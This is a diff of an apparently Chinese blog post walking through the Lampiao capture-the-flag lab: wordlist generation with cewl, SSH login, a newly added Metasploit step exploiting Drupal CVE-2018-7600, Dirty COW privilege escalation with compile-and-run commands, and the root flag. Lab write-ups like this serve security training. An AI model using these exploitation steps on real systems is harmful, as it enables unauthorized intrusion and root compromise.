@@ -12,7 +12,7 @@
 <p><img src="/2021/04/15/Lampiao/1.png"></p>
 <p>发现目标机器开放3个端口，分别为22,80,1898，其中80,1898端口开启web服务。访问80端口，没有发现突破口</p>
 <p><img src="/2021/04/15/Lampiao/2.png"></p>
-<p>1898端口采用Drupal 版本7模板搭建，使用msf的exploit模块攻击无果。访问页面，发现页面存在一些用户名。</p>
+<p>1898端口采用Drupal 版本7模板搭建。访问页面，发现页面存在一些用户名。</p>
 <p><img src="/2021/04/15/Lampiao/3.png"></p>
 <h3 id="0x03-字典生成"><a href="#0x03-字典生成" class="headerlink" title="0x03  字典生成"></a>0x03  字典生成</h3><p>使用cewl生成字典</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl -w dict.txt http:&#x2F;&#x2F;192.168.126.130:1898&#x2F;?q&#x3D;node&#x2F;1</span><br></pre></td></tr></table></figure>
@@ -26,7 +26,17 @@
 <p><img src="/2021/04/15/Lampiao/4.png"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# ssh tiago@192.168.126.130</span><br><span class="line">The authenticity of host &#39;192.168.126.130 (192.168.126.130)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:64C0fMfgIRp&#x2F;7K8EpiEiirq&#x2F;SrPByxrzXzn7bLIqxbU.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;192.168.126.130&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">tiago@192.168.126.130&#39;s password: </span><br><span class="line">Welcome to Ubuntu 14.04.5 LTS (GNU&#x2F;Linux 4.4.0-31-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com&#x2F;</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 15 07:45:44 BRT 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.02              Processes:           297</span><br><span class="line">  Usage of &#x2F;:   7.7% of 19.07GB   Users logged in:     0</span><br><span class="line">  Memory usage: 43%               IP address for eth0: 192.168.126.130</span><br><span class="line">  Swap usage:   1%</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at:</span><br><span class="line">    https:&#x2F;&#x2F;landscape.canonical.com&#x2F;</span><br><span class="line"></span><br><span class="line">Last login: Fri Apr 20 14:40:55 2018 from 192.168.108.1</span><br><span class="line">tiago@lampiao:~$ </span><br></pre></td></tr></table></figure>
 
-<h3 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05  提权"></a>0x05  提权</h3><p>发现低权限，查看内核版本</p>
+<h3 id="0x05-MSF-getshell"><a href="#0x05-MSF-getshell" class="headerlink" title="0x05  MSF getshell"></a>0x05  MSF getshell</h3><p>通过扫目录，发现robots.txt文件，在CHANGELOG.txt文件里发现Drupal版本为7.54</p>
+<p><img src="/2021/04/15/Lampiao/5.png"></p>
+<p>谷歌上查找该版本的历史漏洞，发现7.58版本之前存在CVE-2018-7600</p>
+<p><img src="/2021/04/15/Lampiao/6.png"></p>
+<p>msf里寻找漏洞利用模块，尝试利用一下2018年的那个模块</p>
+<p><img src="/2021/04/15/Lampiao/7.png"></p>
+<p>设置payload</p>
+<p><img src="/2021/04/15/Lampiao/8.png"></p>
+<p>获取meterpreter会话</p>
+<p><img src="/2021/04/15/Lampiao/9.png"></p>
+<h3 id="0x06-脏牛提权"><a href="#0x06-脏牛提权" class="headerlink" title="0x06  脏牛提权"></a>0x06  脏牛提权</h3><p>发现低权限，查看内核版本</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tiago@lampiao:~$ id</span><br><span class="line">uid&#x3D;1000(tiago) gid&#x3D;1000(tiago) groups&#x3D;1000(tiago)</span><br><span class="line"></span><br><span class="line">tiago@lampiao:~$ uname -a</span><br><span class="line">Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
 
 <p>提权探测脚本</p>
@@ -38,7 +48,7 @@
 <p>发现dirtycow可以提权</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux kernel &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复）</span><br><span class="line">脏牛提权exp：https:&#x2F;&#x2F;github.com&#x2F;gbonacini&#x2F;CVE-2016-5195</span><br><span class="line">将dcow.cpp上传到受控机器</span><br><span class="line"></span><br><span class="line">tiago@lampiao:&#x2F;tmp$ ls</span><br><span class="line">dcow.cpp</span><br><span class="line">tiago@lampiao:&#x2F;tmp$ g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil</span><br><span class="line">tiago@lampiao:&#x2F;tmp$ ls</span><br><span class="line">dcow  dcow.cpp</span><br><span class="line">tiago@lampiao:&#x2F;tmp$ chmod +x dcow</span><br><span class="line">tiago@lampiao:&#x2F;tmp$ .&#x2F;dcow -s</span><br><span class="line">Running ...</span><br><span class="line">Password overridden to: dirtyCowFun</span><br><span class="line"></span><br><span class="line">Received su prompt (Password: )</span><br><span class="line"></span><br><span class="line">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;dirty_writeback_centisecs</span><br><span class="line">\cp &#x2F;tmp&#x2F;.ssh_bak &#x2F;etc&#x2F;passwd</span><br><span class="line">\rm &#x2F;tmp&#x2F;.ssh_bak</span><br><span class="line">root@lampiao:~# echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;dirty_writeback_centisecs</span><br><span class="line">root@lampiao:~# \cp &#x2F;tmp&#x2F;.ssh_bak &#x2F;etc&#x2F;passwd</span><br><span class="line">root@lampiao:~# \rm &#x2F;tmp&#x2F;.ssh_bak</span><br><span class="line">root@lampiao:~# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x06-获取flag"><a href="#0x06-获取flag" class="headerlink" title="0x06 获取flag"></a>0x06 获取flag</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@lampiao:~# pwd</span><br><span class="line">&#x2F;root</span><br><span class="line">root@lampiao:~# ls</span><br><span class="line">flag.txt</span><br><span class="line">root@lampiao:~# cat flag.txt </span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
+<h3 id="0x07-获取flag"><a href="#0x07-获取flag" class="headerlink" title="0x07 获取flag"></a>0x07 获取flag</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@lampiao:~# pwd</span><br><span class="line">&#x2F;root</span><br><span class="line">root@lampiao:~# ls</span><br><span class="line">flag.txt</span><br><span class="line">root@lampiao:~# cat flag.txt </span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
 
 
 
